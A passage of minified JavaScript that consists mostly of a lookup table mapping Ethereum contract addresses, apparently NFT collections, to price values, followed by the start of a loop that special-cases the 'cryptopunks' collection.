                "0x59468516a8259058bad1ca5f8f4bff190d30e066": 3.43683,
                "0x1a92f7381b9f03921564a437210bb9396471050c": 3.48353,
                "0xe785e82358879f061bc3dcac6f0444462d4b5330": 2.87929,
                "0x7d8820fa92eb1584636f4f5b8515b5476b75171a": 2.08328,
                "0x9df8aa7c681f33e442a0d57b838555da863504f3": 1.48122,
                "0x34d85c9cdeb23fa97cb08333b511ac86e1c4e258": 3.25004,
                "0x160c404b2b49cbc3240055ceaee026df1e8497a0": .22416,
                "0x70C8Eb24c5A2a429C635886a433571eE70a93DB3": (.22416,
                .1569),
                "0x7eaa96d48380802a75ed6d74b91e2b30c3d474c1": .40688,
                "0xb668beb1fa440f6cf2da0399f8c28cab993bdd65": 8.8343,
                "0x513cd71defc801b9c1aa763db47b5df223da77a2": 6.883,
                "0x5b7622ded96511639ddc12c86eb2703331ca2c78": .19415,
                "0xc9677cd8e9652f1b1aadd3429769b0ef8d7a0425": 1.92167,
                "0x9705a7113363a383c8a96689e20286abe6612bb3": .79468,
                "0x1792a96e5668ad7c167ab804a100ce42395ce54d": 1.28849,
                "0x08ba8cbbefa64aaf9df25e57fe3f15ecc277af74": 5.755,
                "0xce17f8ef13cf67da6eab86e31360102eea8609ff": 2.21447,
                "0x6dc6001535e15b9def7b0f6a20a2111dfa9454e2": 1.12671,
                "0x6fc3ad6177b07227647ad6b4ae03cc476541a2a0": 1.91582,
                "0x9168224fd1033ca25aaebae9eff39c92bd15231c": .271,
                "0xf81ead7c021ef1aef78ec1ffe1e4abd0ecdb216d": .91556,
                "0x6d4bbc0387dd4759eee30f6a482ac6dc2df3facf": 1.51764,
                "0xf54cc94f1f2f5de012b6aa51f1e7ebdc43ef5afc": .36656,
                "0x1cb1a5e65610aeff2551a50f76a87a7d3fb649c6": 2.02871,
                "0x8a939fd297fab7388d6e6c634eee3c863626be57": 7.46889,
                "0x78d61c684a992b0289bbfe58aaa2659f667907f8": .75161,
                "0x496a2d17a89cbc4248e9b52c8003a50c648fbca0": 2.09829,
                "0xae3d8d68b4f6c3ee784b2b0669885a315ba77c08": 1.12525,
                "0xe0176ba60efddb29cac5b15338c9962daee9de0c": .34525,
                "0x0825f050e9b021a0e9de8cb1fb10b6c9f41e834c": 1.61533,
                "0x892848074ddea461a15f337250da3ce55580ca85": 1.19934,
                "0xc9d8f15803c645e98b17710a0b6593f097064bef": 3.80792,
                "0x20ed6cdf9344b3a187063a3ff4d883b6b1947b81": .67082,
                "0xccc441ac31f02cd96c153db6fd5fe0a2f4e6a68d": 2.68912,
                "0x7cc7add921e2222738561d03c89589929cefcf21": .33352,
                "0x16de9d750f4ac24226154c40980ef83d4d3fd4ad": 1.06925,
                "0xb6329bd2741c4e5e91e26c4e653db643e74b2b19": 1.92237,
                "0xab0b0dd7e4eab0f9e31a539074a03f1c1be80879": 1.93281,
                "0xf661d58cfe893993b11d53d11148c4650590c692": .60498,
                "0x2250d7c238392f4b575bb26c672afe45f0adcb75": 1.90943,
                "0xd2f668a8461d6761115daf8aeb3cdf5f40c532c6": .29462,
                "0xf87e31492faf9a91b02ee0deaad50d51d56d5d4d": 2.74506,
                "0x959e104e1a4db6317fa58f8295f586e1a978c297": 2.74506,
                "0x521f9c7505005cfa19a8e5786a9c3c9c9f5e6f42": 1.34235,
                "0x31b6d1289f96818e79dbb271bf77e8132b86e814": .35112,
                "0x79fcdef22feed20eddacbb2587640e45491b757f": 1.2835,
                "0x3903d4ffaaa700b62578a66e7a67ba4cb67787f9": 1.04069,
                "0xd0318da435dbce0b347cc6faa330b5a9889e3585": .71654,
                "0x529a4e15b3ce13523417f945ecd0959ff71e0a9e": .49818,
                "0x6080b6d2c02e9a0853495b87ce6a65e353b74744": .18025,
                "0xbd3531da5cf5857e7cfaa92426877b022e612cf8": 3.2586,
                "0x75e95ba5997eb235f40ecf8347cdb11f18ff640b": .71627,
                "0x2acab3dea77832c09420663b0e1cb386031ba17b": 1.08892,
                "0x960b7a6bcd451c9968473f7bbfd9be826efd549a": .79847,
                "0x0bd4d37e0907c9f564aaa0a7528837b81b25c605": .24814,
                "0x28472a58a490c5e09a238847f66a68a47cc76f0f": .50519,
                "0x03ef30e1aee25abd320ad961b8cd31aa1a011c97": .25673,
                "0x9c80777cae192e5031c38a0d951c55730ecc3f5e": .27822,
                "0x6e9da81ce622fb65abf6a8d8040e460ff2543add": 1.25436,
                "0x5cc5b05a8a13e3fbdb0bb9fccd98d38e50f90c38": 1.87028,
                "0x0972290a80333d19c6703073c3e57134a4ca0127": .5238,
                "0xb4d06d46a8285f4ec79fd294f78a881799d8ced9": .16976,
                "0x3abedba3052845ce3f57818032bfa747cded3fca": .49555,
                "0x38a6fd7148c4900338e903258b5e289dfa995e2e": .4295,
                "0xfe8c6d19365453d26af321d0e8c910428c23873f": 1.42853,
                "0x950b9476a4de757bb134483029ac4ec17e739e3a": 1.01251,
                "0xa1d4657e0e6507d5a94d06da93e94dc7c8c44b51": .54274,
                "0x5bd815fd6c096bab38b4c6553cfce3585194dff9": .33276,
                "0x9c8d2f53f6bff84458f1c84fdaa1e4852ca958e3": .6945,
                "0x880644ddf208e471c6f2230d31f9027578fa6fcc": .78313,
                "0x5be99338289909d6dbbc57bb791140ef85ccbcab": .16237,
                "0x698fbaaca64944376e2cdc4cad86eaa91362cf54": .54513,
                "0xd7b397edad16ca8111ca4a3b832d0a5e3ae2438c": 1.01308,
                "0x86c10d10eca1fca9daf87a279abccabe0063f247": .18855,
                "0x09233d553058c2f42ba751c87816a8e9fae7ef10": 1.02269,
                "0x9378368ba6b85c1fba5b131b530f5f5bedf21a18": .5554,
                "0x0c2e57efddba8c768147d1fdf9176a0a6ebd5d83": .60386,
                "0xef0182dc0574cd5874494a120750fd222fdb909a": .75086,
                "0xeb3a9a839dfeeaf71db1b4ed6a8ae0ccb171b227": .51722,
                "0x1b829b926a14634d36625e60165c0770c09d02b2": .78407,
                "0xb5c747561a185a146f83cfff25bdfd2455b31ff4": .38502,
                "0x123b30e25973fecd8354dd5f41cc45a3065ef88c": .4962,
                "0x4b61413d4392c806e6d0ff5ee91e6073c21d6430": .07459,
                "0x97597002980134bea46250aa0510c9b90d87a587": .26168,
                "0x8943c7bac1914c9a7aba750bf2b6b09fd21037e0": .53538,
                "0x0b4b2ba334f476c8f41bfe52a428d6891755554d": .68414,
                "0x7ea3cca10668b8346aec0bf1844a49e995527c8b": .87116,
                "0x7948f7ff1158b338a898e80ce8b1c3c964a80cec": 1.65,
                "0xf61f24c2d93bf2de187546b14425bf631f28d6dc": .32957,
                "0x495b01c1bc3b9203fde4362d9913c692fb661f3f": .19344,
                "0xbad6186e92002e312078b5a1dafd5ddf63d3f731": .28647,
                "0x0cfb5d82be2b949e8fa73a656df91821e2ad99fd": .53248,
                "0x72d47d4d24018ec9048a9b0ae226f1c525b7e794": .20334,
                "0x7ecb204fed7e386386cab46a1fcb823ec5067ad5": .7088,
                "0xbd275ce24f32d6ce4e9d9519c55abe9bc0ed7fcf": .23309,
                "0x35471f47c3c0bc5fc75025b97a19ecdde00f78f8": .44225,
                "0x5af0d9827e0c53e4799bb226655a1de152a425a5": .41008,
                "0x9a38dec0590abc8c883d72e52391090e948ddf12": .15247,
                "0xcefc0a83564dd2a083b83b4a73bbae97e40fa7ea": .15588,
                "0x7afe30cb3e53dba6801aa0ea647a0ecea7cbe18d": .89311,
                "0xa6a5ec7b1b8a34ff2dcb2926b7c78f52a5ce3b90": .14913,
                "0xd73acd7f5099fdd910215dbff029185f21ffbcf0": .14829,
                "0xfcb1315c4273954f74cb16d5b663dbf479eec62e": .26432,
                "0x1afef6b252cc35ec061efe6a9676c90915a73f18": .54444,
                "0x67d9417c9c3c250f61a83c7e8658dac487b56b09": .30492,
                "0x7afeda4c714e1c0a2a1248332c100924506ac8e6": .30255,
                "0x970d5e0bd5c4f193fccf7fd579590c5f5c69b2d9": .20371,
                "0x98a0227e99e7af0f1f0d51746211a245c3b859c2": .16676,
                "0xc1caf0c19a8ac28c41fe59ba6c754e4b9bd54de9": .5879,
                "0x364c828ee171616a39897688a831c2499ad972ec": .8366,
                "0x13927739076014913a3a7c207ef84c5be4780014": .33486,
                "0x25cd67e2dfec471acd3cdd3b22ccf7147596dd8b": .05985,
                "0xa5c0bd78d1667c13bfb403e2a3336871396713c5": .14731,
                "0x8d4100897447d173289560bc85c5c432be4f44e4": .13706,
                "0x4a8c9d751eeabc5521a68fb080dd7e72e46462af": .27039,
                "0x4db1f25d3d98600140dfc18deb7515be5bd293af": .65001,
                "0xad9fd7cb4fc7a0fbce08d64068f60cbde22ed34c": .76609,
                "0x4a537f61ef574153664c0dbc8c8f4b900cacbe5d": .55536,
                "0x3fe1a4c1481c8351e91b64d5c398b159de07cbc5": .28493,
                "0x8ffb9b504d497e4000967391e70d542b8cc6748a": .10018,
                "0xf4ee95274741437636e748ddac70818b4ed7d043": .28625,
                "0xa5e25b44b01e09b7455851838c76cde68d13e29f": .29878,
                "0x177ef8787ceb5d4596b6f011df08c86eb84380dc": .12758,
                "0x2f102e69cbce4938cf7fb27adb40fad097a13668": .52617,
                "0xd78b76fcc33cd416da9d3d42f72649a23d7ac647": .41263,
                "0xc8e1de8dc39a758c7a50f659b53f787e0f1398bd": .05563,
                "0x58519ea95cdfad3622c4c574e61a58fa257d9e77": .17855,
                "0xe70da20a2b10d60ca620a4e494fe2b37c9499e97": .18649,
                "0x226bf5293692610692e2c996c9875c914d2a7f73": .61576,
                "0xe51aac67b09eaed6d3d43e794d6bae679cbe09d8": .55998,
                "0x338be3d8d0209815601e72f7a04ac7f37d61564b": .66632,
                "0x716f29b8972d551294d9e02b3eb0fc1107fbf4aa": .69065,
                "0x466cfcd0525189b573e794f554b8a751279213ac": 1.27604,
                "0x80336ad7a747236ef41f47ed2c7641828a480baa": 1.67619,
                "0x509a050f573be0d5e01a73c3726e17161729558b": 12,
                "0xfc2068c3d47b575a60f6a4a7bf60dea0ac368e01": 2.37459,
                "0x19b86299c21505cdf59ce63740b240a9c822b5e4": .65183,
                "0x130cfab3817467f532c179d4e6502f5a7e7d44c7": .4862,
                "0xdd012153e008346591153fff28b0dd6724f0c256": 11.26667,
                "0x77640cf3f89a4f1b5ca3a1e5c87f3f5b12ebf87e": .55395,
                "0xbce3781ae7ca1a5e050bd9c4c77369867ebc307e": 1.04694,
                "0xd2a077ec359d94e0a0b7e84435eacb40a67a817c": 4.10157,
                "0xf729f878f95548bc7f14b127c96089cf121505f8": 1.17861,
                "0xb852c6b5892256c264cc2c888ea462189154d8d7": .5536,
                "0xd497a414bb00803e846b53d07fcb742831b24906": .60132,
                "0xc23a563a26afff06e945ace77173e1568f288ce5": .18018,
                "0xfb10b1717c92e9cc2d634080c3c337808408d9e1": 10,
                "0xaadc2d4261199ce24a4b0a57370c4fcf43bb60aa": 4.48802,
                "0xeaa4c58427c184413b04db47889b28b5c98ebb7b": 13.14444,
                "0xbeb1d3357cd525947b16a9f7a2b3d50b50b977bd": 1.2888,
                "0x1fa8da0b63c639a7b53bae343e5761d56f898bac": 2.76118,
                "0x6b00de202e3cd03c523ca05d8b47231dbdd9142b": 2.65571,
                "0x9d6a7159e5accfc6520932f0f81a47e2ffd349a3": 7.86395,
                "0x2c2ed910eb79b48fbbd949ad59636ffca83c8a17": 3.12907,
                "0x76236b6f13f687d0bbedbbce0e30e9f07d071c1c": 1.71379,
                "0xaa3fdc4a0700b82c9aa80655624d32701dc92946": 2.01429,
                "0x251b5f14a825c537ff788604ea1b58e49b70726f": 2.69286,
                "0x8d04a8c79ceb0889bdd12acdf3fa9d207ed3ff63": 3.28005,
                "0x26437d312fb36bdd7ac9f322a6d4ccfe0c4fa313": 1.68317,
                "0xd0a07a76746707f6d6d36d9d5897b14a8e9ed493": .41911,
                "0x1eff5ed809c994ee2f500f076cef22ef3fd9c25d": 2.97726,
                "0x89ecbeb233aa34c88c5d7d02d8113726dbc1bc78": .64,
                "0xd0f0c40fcd1598721567f140ebf8af436e7b97cf": 1.98551,
                "0xcd1dbc840e1222a445be7c1d8ecb900f9d930695": 2.34068,
                "0xdfacd840f462c27b0127fc76b63e7925bed0f9d5": 1.45,
                "0x1897d69cc0088d89c1e94889fbd2efffcefed778": 2.80667,
                "0xbc4ca343167a5e2d9f700cf5b6b3f849585cd6fc": 2.03,
                "0x20c70bdfcc398c1f06ba81730c8b52ace3af7cc3": 8.47182,
                "0x614917f589593189ac27ac8b81064cbe450c35e3": 1.32826,
                "0xc0cf5b82ae2352303b2ea02c3be88e23f2594171": 1.20633,
                "0xb228d7b6e099618ca71bd5522b3a8c3788a8f172": .8221,
                "0x026224a2940bfe258d0dbe947919b62fe321f042": .99795,
                "0x068f74749c24a42058563035f8c786362fc96494": .62156,
                "0xbdde08bd57e5c9fd563ee7ac61618cb2ecdc0ce0": .92091,
                "0xc5b52253f5225835cc81c52cdb3d6a22bc3b0c93": .43883,
                "0xb336ae11e840e8d38d1453fd3d876cf4797f6716": .62848,
                "0x659a4bdaaacc62d2bd9cb18225d9c89b5b697a5a": .10692,
                "0x9f9b2b8e268d06dc67f0f76627654b80e219e1d6": .09297,
                "0xda60730e1feaa7d8321f62ffb069edd869e57d02": .14035,
                "0x248139afb8d3a2e16154fbe4fb528a3a214fd8e7": .11335,
                "0xc1ad47aeb274157e24a5f01b5857830aef962843": .05704,
                "0x9a06ef3a841316a9e2c1c93b9c21a7342abe484f": .41059,
                "0xb7be4001bff2c5f4a61dd2435e4c9a19d8d12343": .27689,
                "0x390416ae4324494338293974ee6388e777fac34b": .19222,
                "0x36d30b3b85255473d27dd0f7fd8f35e36a9d6f06": .10937,
                "0x2a378c8d96e7d994fb9bec6adb7c6af2fe772c3b": 2.07792,
                "0x698ff9c45f261e963ce060d1eb42099eaed333ae": .28052,
                "0x497a9a79e82e6fc0ff10a16f6f75e6fcd5ae65a8": .21046,
                "0x2120d19431e0dd49411e5412629f8e41a72cfabd": .17031,
                "0xaad35c2dadbe77f97301617d82e661776c891fa9": .6199,
                "0x709d30f1f60f03d85a0ef33142ef3259392dc9e1": .1131,
                "0x0a36f2178c0db2c85471c45334a1dd17d130fd42": 5.11968,
                "0xe6160325a53de4deca66e3d88d7e4f25040acce0": .56841,
                "0x6728d91abacdbac2f326baa384513a523c21b80a": .09526,
                "0x704bf12276f5c4bc9349d0e119027ead839b081b": .5171,
                "0x06b3fcc9e79d724a08012f0b9f71bd03b415d334": .24644,
                "0x5180db8f5c931aae63c74266b211f580155ecac8": .28157,
                "0xec7f8a34b97ac65caad3841659f2cd54285a3950": .17005,
                "0x54251bc32a9f389df7c764ab50bb829ccdcb41bc": .06081,
                "0x26badf693f2b103b021c670c852262b379bbbe8a": .73705,
                "0x0616a2ef54bad0b37dce41c8d8e35cce17a926f3": .26148,
                "0x9b091d2e0bb88ace4fe8f0fab87b93d8ba932ec4": .96123,
                "0xd9c036e9eef725e5aca4a22239a23feb47c3f05d": .2734,
                "0x8de878b9b29bfbb33eec346965194a37a83b45b1": .19422,
                "0x244fc4178fa685af909c88b4d4cd7eb9127edb0b": .5119,
                "0x6199a4a9a290b0b77ff2e113abe9d1ad4ab5ac63": .08508,
                "0xea0acbb7449b59bccc5f3d4bc4af882e8afde148": .08436,
                "0xc3f8a0f5841abff777d3eefa5047e8d413a1c9ab": .33116,
                "0xc2c747e0f7004f9e8817db2ca4997657a7746928": .5317,
                "0xa65ba71d653f62c64d97099b58d25a955eb374a0": .78119,
                "0x1e1dcf251468ff7fbf6d3c76d783ba9f00ca045d": .1072,
                "0xc8adfb4d437357d0a656d4e62fd9a6d22e401aa0": .09712,
                "0xeF1a89cbfAbE59397FfdA11Fc5DF293E9bC5Db90": .15796,
                "0xc99c679c50033bbc5321eb88752e89a93e9e83c5": 1.51466,
                "0xbbe23e96c48030dc5d4906e73c4876c254100d33": .25434,
                "0x986aea67c7d6a15036e18678065eb663fc5be883": .13559,
                "0x0ffa87cd27ae121b10b3f044dda4d28f9fb8f079": .54178,
                "0x092bbc993042a69811d23feb0e64e3bfa0920c6a": .24245,
                "0xabf66ca534f8a5081303e3873f0f4771c67b7b45": .13803,
                "0xd9f092bdf2b6eaf303fc09cc952e94253ae32fae": .17516,
                "0xc2e9678a71e50e5aed036e00e9c5caeb1ac5987d": 1.10896,
                "0x22c08c358f62f35b742d023bf2faf67e30e5376e": .0519,
                "0x809d8f2b12454fc07408d2479cf6dc701ecd5a9f": .3061,
                "0x51ae5e2533854495f6c587865af64119db8f59b4": .10938,
                "0x0beed7099af7514ccedf642cfea435731176fb02": .13159,
                "0xc7df86762ba83f2a6197e1ff9bb40ae0f696b9e6": .13783,
                "0x7721e8dd956e07f7254385a7c039e9bde92e425d": .10588,
                "0x984f7b398d577c0adde08293a53ae9d3b6b7a5c5": .12183,
                "0x80a4b80c653112b789517eb28ac111519b608b19": .08343,
                "0xa08126f5e1ed91a635987071e6ff5eb2aeb67c48": .22007,
                "0x4e76c23fe2a4e37b5e07b5625e17098baab86c18": .10918,
                "0x4b103d07c18798365946e76845edc6b565779402": .12972,
                "0x46fdfcb3cd89a1c54d36ee83a4adc184747b40d9": .32831,
                "0x4e1f41613c9084fdb9e34e11fae9412427480e56": 1.64202,
                "0x39ee2c7b3cb80254225884ca001f57118c8f21b6": 1.39694,
                "0xccf3baa603dfddd7c41619fdb8dd0306b11571fe": 1.44061,
                "0x2a459947f0ac25ec28c197f09c2d88058a83f3bb": .0602,
                "0x670d4dd2e6badfbbd372d0d37e06cd2852754a04": .5219,
                "0x33c6eec1723b12c46732f7ab41398de45641fa42": .3042,
                "0x7daec605e9e2a1717326eedfd660601e2753a057": .53726,
                "0x6d0de90cdc47047982238fcf69944555d27ecb25": .10246,
                "0xe21ebcd28d37a67757b9bc7b290f4c4928a430b1": .3086,
                "0x3e7fc44e25c07be3d67c241e6e59cb838df2f892": .62045,
                "0x36f4d96fe0d4eb33cdc2dc6c0bca15b9cdd0d648": 2.95362,
                "0x42069abfe407c60cf4ae4112bedead391dba1cdb": 2.43998,
                "0x50f5474724e0ee42d9a4e711ccfb275809fd6d4a": 1.87028,
                "0x684e4ed51d350b4d76a3a07864df572d24e6dc4c": .13019,
                "0xff9c1b15b16263c61d017ee9f65c50e4ae0113d7": .95868,
                "0x845a007d9f283614f403a24e3eb3455f720559ca": 1.28008,
                "0x3110ef5f612208724ca51f5761a69081809f03b7": .62022,
                "0x9f83b08d90eeda539f7e2797fed3f6996917bba8": .29177,
                "0xbce6d2aa86934af4317ab8615f89e3f9430914cb": .28797,
                "0x31385d3520bced94f77aae104b406994d8f2168c": .59383,
                "0x73da73ef3a6982109c4d5bdb0db9dd3e3783f313": .42941,
                "0x2a036569dbbe7730d69ed664b74412e49f43c2c0": .1924,
                "0x8ff1523091c9517bc328223d50b52ef450200339": .35745,
                "0xba627f3d081cc97ac0edc40591eda7053ac63532": .28936,
                "0x12787526c03d626aac88e6edc4d0fb930d86c631": .6474,
                "0xe6d48bf4ee912235398b96e16db6f310c21e82cb": .64342,
                "0x11ca9693156929ee2e7e1470c5e1a55b413e9007": .22744,
                "0x41f20599e9e049004c4d169046eb7023117a6244": .16756,
                "0x9a534628b4062e123ce7ee2222ec20b86e16ca8f": .37281,
                "0xa03e357a09e761e8d486a1419c74bf42e8d1b064": .23891,
                "0xb08a61d96108136439180ad3f3e340a24e448f6b": .31065,
                "0xb75f09b4340aeb85cd5f2dd87d31751edc11ed39": .27935,
                "0x8eaa9ae1ac89b1c8c8a8104d08c045f78aadb42d": .22738,
                "0x524cab2ec69124574082676e6f654a18df49a048": .20661,
                "0x86cc280d0bac0bd4ea38ba7d31e895aa20cceb4b": .31032,
                "0x1ecfdccf97edd64fb73890ca4541f306456a21ec": .46463,
                "0xc3f733ca98e0dad0386979eb96fb1722a1a05e69": .39451,
                "0x913ae503153d9a335398d0785ba60a2d63ddb4e2": 2.07792,
                "0x4b10701bfd7bfedc47d50562b76b436fbb5bdb3b": .16134,
                "0x06911466341299d79e9e1368a016c73d009691cc": .65621,
                "0x582048c4077a34e7c3799962f1f8c5342a3f4b12": .1077,
                "0xf07468ead8cf26c752c676e43c814fee9c8cf402": .34115,
                "0x65d8b2bf930a0015028efcaee5af7bf61b90b76f": .39778,
                "0x9d20cff2db7e1c23c3fc6ef000ea0f36b428e3f5": .659,
                "0x8a1bbef259b00ced668a8c69e50d92619c672176": .23012,
                "0xdfe3ac769b2d8e382cb86143e0b0b497e1ed5447": .27072,
                "0x7b692917124f64e1658d67c72ab5df5219078e37": .21968,
                "0x3113a3c04aebec2b77eb38eabf6a2257b580c54b": .36335,
                "0x27787755137863bb7f2387ed34942543c9f24efe": 1.05067,
                "0x4addca4c07a5e9a6b4973094d03ad5aae7735e5b": .12954,
                "0xa5bb28eecc6134f89745e34ec6ab5d5bcb16dad7": .37799,
                "0xa3106416fde395bf6a62b8e932df01f5f660a5f2": .26573,
                "0x32973908faee0bf825a343000fe412ebe56f802a": .66761,
                "0x0e043e39e1f9382e4b3cb9b859a1452a93993be7": .10887,
                "0x7ab2352b1d2e185560494d5e577f9d3c238b78c5": .36844,
                "0x8dc7b6ec6fafa36085ee9ec8e39112428d3360aa": .20083,
                "0x258aeac01672e6857972707fc129a6a39d09758b": .22705,
                "0xcd041f40d497038e2da65988b7d7e2c0d9244619": .10666,
                "0xe010242f4503b33834e1a830c8abe7d4363dcd2a": .08724,
                "0x4287bd7cc2b4aa8650e2887055a4674759c216e2": .14991,
                "0xc878671ff88f1374d2186127573e4a63931370fc": .16766,
                "0x9f1f2696f4e8f138c1cc92361960665cb2d4617e": .52024,
                "0xd532b88607b1877fe20c181cba2550e3bbd6b31c": .28294,
                "0xd1169e5349d1cb9941f3dcba135c8a4b9eacfdde": .62068,
                "0xedf6d3c3664606fe9ee3a9796d5cc75e3b16e682": .08857,
                "0x2cf6be9aac1c7630d5a23af88c28275c70eb8819": .32438,
                "0x51f0c1938b0e67cafc7a6fc8eb6edd7fdbe002bc": .26986,
                "0x3bf2922f4520a8ba0c2efc3d2a1539678dad5e9d": .61569,
                "0x1e725bcc09ad221d35af5adeda404fb2147b43fa": .20878,
                "0xf76179bb0924ba7da8e7b7fc2779495d7a7939d8": .80719,
                "0x65c234d041f9ef96e2f126263727dfa582206d82": .10241,
                "0x11450058d796b02eb53e65374be59cff65d3fe7f": .82718,
                "0x5079fc4e96338be1b5aff236ff4b00ec4452b2d3": .33277,
                "0x696115768bbef67be8bd408d760332a7efbee92d": .5727,
                "0xf64e6fb725f04042b5197e2529b84be4a925902c": .53855,
                "0x7deda0afe6df3da6a85a87b371f8b464c30c6803": .07169,
                "0xc92ceddfb8dd984a89fb494c376f9a48b999aafc": .34042,
                "0xa4b37d6c9e087317be73c39b826189a1f6f8a6d8": .1227,
                "0x05218d1744caf09190f72333f9167ce12d18af5c": .18143,
                "0x78a5e2b8c280fa5580fbe1e1ed546183f959d305": .25401,
                "0xc67b9897d793a823f0e9cf850aa1b0d23e3f8d09": .09228,
                "0x6ece2e550d7848c40c26a0e704b7a19d1f8dbcf0": .3003,
                "0xe9fca552b9eb110c2d170962af740725f71f5644": .1491,
                "0x10cdcb5a80e888ec9e9154439e86b911f684da7b": .14362,
                "0x282a7d13152b3f51a3e31d46a2ca563f8554d85d": .1773,
                "0xca7ca7bcc765f77339be2d648ba53ce9c8a262bd": .10187,
                "0xe3f92992bb4f0f0d173623a52b2922d65172601d": .2658,
                "0x2efa07cac3395599db83035d196f2a0e7263f766": .15837,
                "0xb32979486938aa9694bfc898f35dbed459f44424": .84281,
                "0x94638cbf3c54c1f956a5f05cbc0f9afb6822020d": .2584,
                "0x11595ffb2d3612d810612e34bc1c2e6d6de55d26": .75,
                "0x0f78c6eee3c89ff37fd9ef96bd685830993636f2": .1413,
                "0x3bf99d504e67a977f88b417ab68d34915f3a1209": 1.53954,
                "0xa4d5fb4ff0fa1565fb7d8f5db88e4c0f2f445046": .13271,
                "0xc2ac394984f3850027dac95fe8a62e446c5fb786": .20803,
                "0x6632a9d63e142f17a668064d41a21193b49b41a0": .39124,
                "0x249aeaa7fa06a63ea5389b72217476db881294df": .25155,
                "0x099689220846644f87d1137665cded7bf3422747": .21492,
                "0x345c2fa23160c63218dfaa25d37269f26c85ca47": .1138,
                "0x1d0ec4a86ac39fef4485169b4d14dc39d0ea64cd": .39163,
                "0xdc403fcdf735426e77fdd3bbd6223a3ac03ef3b3": .21273,
                "0x3e6046b4d127179f0a421f3148b43cf52c08fc41": .08512,
                "0x83f82414b5065bb9a85e330c67b4a10f798f4ed2": .15512,
                "0x1a2f71468f656e97c2f86541e57189f59951efe7": .12652,
                "0x8442dd3e5529063b43c69212d64d5ad67b726ea6": .13014,
                "0xf1268733c6fb05ef6be9cf23d24436dcd6e0b35e": .2406,
                "0x68f4ba8018216542ac2ab8125166be66304dd71c": .40712,
                "0x7a15b36cb834aea88553de69077d3777460d73ac": .40762,
                "0xaadba140ae5e4c8a9ef0cc86ea3124b446e3e46a": .15369,
                "0x657fabdb226abc59227e02e94089afbc67a597fe": .18805,
                "0x52e66ca968010d064938a8099a172cbaaf08c125": .43946,
                "0xf0d2d631a24db247f5eb0421fa3e6a169c72565f": .3442,
                "0x7d22279e26df02c9c77db263ce4bb9a501b687ba": 1.345,
                "0x8c186802b1992f7650ac865d4ca94d55ff3c0d17": .20981,
                "0x18487d2cac946c7fe800855c4039aac210f68baa": .13701,
                "0x13d15d8b7b2bf48cbaf144c5c50e67b6b635b5cd": .53061,
                "0x469823c7b84264d1bafbcd6010e9cdf1cac305a3": .2945,
                "0xf9c362cdd6eeba080dd87845e88512aa0a18c615": .16224,
                "0x548c407d35cdd3c812458d9ef6d135963f9f7ece": .119,
                "0x219b8ab790decc32444a6600971c7c3718252539": .22528,
                "0x8cd8155e1af6ad31dd9eec2ced37e04145acfcb3": .09959,
                "0x9eeaecbe2884aa7e82f450e3fc174f30fc2a8de3": .16603,
                "0x3598fff0f78dd8b497e12a3ad91febcfc8f49d9e": .20832,
                "0xd4d871419714b778ebec2e22c7c53572b573706e": .12626,
                "0x1bb6edf7b129967d512086fbdf489ed659580916": .07098,
                "0x120e1f9e4067e547f2ff4ab379f67ed26ac0cb93": .28585,
                "0xdb55584e5104505a6b38776ee4dcba7dd6bb25fe": .13922,
                "0xf4121a2880c225f90dc3b3466226908c9cb2b085": .11822,
                "0xcbc67ea382f8a006d46eeeb7255876beb7d7f14d": .10701,
                "0x5113a3dd866a3ee8e973fc764cc380e6f07416ef": .29091,
                "0x4d928fada59f3446627c5bea707a81e006cf676f": .30266,
                "0x2d92c4f9f75308d0b9b098b142369032e4f901ff": .08627,
                "0xd6d80461b1875a8679fe789db689156f42b7f86b": .18285,
                "0x4d232cd85294acd53ec03f4a57f57888c9ea1946": .22514,
                "0xba2aa4b18752e75e210fba0424e565af3afb8fc7": .10132,
                "0x2d366be8fa4d15c289964dd4adf7be6cc5e896e8": .58202,
                "0x9401518f4ebba857baa879d9f76e1cc8b31ed197": .18114,
                "0xe4758ebd21a66d4c48dd0cca0a1cc36ac84d5a70": .45737,
                "0xe106c63e655df0e300b78336af587f300cff9e76": .23566,
                "0xedfc4f35060de1a30e08b0d8b9986a4adbdf6c59": .14472,
                "0x6400c9cf1961a36b40616ead83e87a973f47f548": .36333,
                "0x74f1716a9f452dd36d945368d806cd491290b240": .15182,
                "0xda2686fd32c6b74d55605cfb48bef331771e7fc6": .16351,
                "0x8ab727ccf9f57b06535153d1595d157bf5e8f22f": .16182,
                "0x80dbbdcb4280030fb22e2a9d671a368211d49d6e": .38261,
                "0xbcbeae3620b3280df67143ad7ec45d67c5a4355e": .54695,
                "0x7feb477600a03fd6ab1fe451cb3c7836a420f4ad": .07412,
                "0x67421c8622f8e38fe9868b4636b8dc855347d570": .12664,
                "0x1ca39c7f0f65b4da24b094a9afac7acf626b7f38": .09526,
                "0xdd70af84ba86f29bf437756b655110d134b5651c": .19234,
                "0x15cc16bfe6fac624247490aa29b6d632be549f00": .10385,
                "0x439cac149b935ae1d726569800972e1669d17094": .17474,
                "0x3db5463a9e2d04334192c6f2dd4b72def4751a61": .19548,
                "0xddb149ae8e6635df01a530da1e46921bd78dc385": .11159,
                "0xeda3b617646b5fc8c9c696e0356390128ce900f8": .25466,
                "0x322987cd1e0466be43fa88ae33e2637dff46f06f": .12169,
                "0x9759226b2f8ddeff81583e244ef3bd13aaa7e4a1": .09779,
                "0x5bdf397bb2912859dbd8011f320a222f79a28d2e": .2206,
                "0x5423856728612f358c84a37805799755be2722c8": 1.29729,
                "0x52d8a9825fb8b90ea45136eddb103b4ccc0c7940": 2.088,
                "0xf68f9bf35312c228c9d213f31c477c92032d80b7": .94929,
                "0x595a70409711f20523bd99b83d088cea9d3f92e1": .26111,
                "0x82262bfba3e25816b4c720f1070a71c7c16a8fc4": 1.75,
                "0x67062888a7c4d7acac8d4ee82920aa1e0189accc": .1021,
                "0xc36442b4a4522e871399cd717abdd847ab11fe88": .1,
                "0xe8f88d16f24255fcfab25959705d724406d67d9d": 2.525,
                "0x92c93fafc20fe882a448f86e594d9667259c42c8": .17535,
                "0xfe5a28f19934851695783a0c8ccb25d678bb05d3": .49093,
                "0x2c3fc1d826bc12027d05fbe3aeace0a2453bf9fd": 1.92237,
                "0x3b1417c1f204607deda4767929497256e4ff540c": .09277,
                "0x1485297e942ce64e0870ece60179dfda34b4c625": .07644,
                "0x740c178e10662bbb050bde257bfa318defe3cabc": .189,
                "0xc9d198089d6c31d0ca5cc5b92c97a57a97bbfde2": .1824,
                "0x31d45de84fde2fb36575085e05754a4932dd5170": .56097,
                "0xd1258db6ac08eb0e625b75b371c023da478e94a9": 14.5743
            };
            known_prices = c;
            const W = {}
              , m = d.map((async d=>{
                const c = d.collection.slug;
                if ("cryptopunks" == c)
